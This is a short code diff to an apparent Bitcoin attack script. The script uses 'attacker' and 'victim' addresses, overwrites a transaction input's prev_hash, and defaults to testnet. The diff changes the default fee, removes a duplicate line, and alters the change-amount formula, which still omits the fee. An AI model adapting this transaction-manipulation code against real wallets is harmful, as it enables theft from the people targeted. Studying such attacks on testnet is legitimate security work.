@@ -37,8 +37,8 @@ parser.add_argument("--is_testnet",
                     default=True,
                     type=bool)
 parser.add_argument("--fee",
-                    help="BTC send fee. (Default=0.00015)",
-                    default=0.00015,
+                    help="BTC send fee. (Default=0.0001)",
+                    default=0.0001,
                     type=float)
 parser.add_argument("--last_txid",
                     "-txid",
@@ -78,7 +78,6 @@ attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
 fee        = args.fee
-fee        = args.fee
 last_txid  = args.last_txid
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
@@ -100,7 +99,7 @@ print(f"Balance (satoshi unit): {balance}")
 
 send_amount = to_satoshi(amount_btc)
 fee = to_satoshi(fee)
-change_btc_amt = (balance - (send_amount - fee)) #おつり
+change_btc_amt = (balance - (send_amount)) #おつり
 tx_victim = [{"address": victim_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
 tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim["ins"][0]["prev_hash"] = last_txid
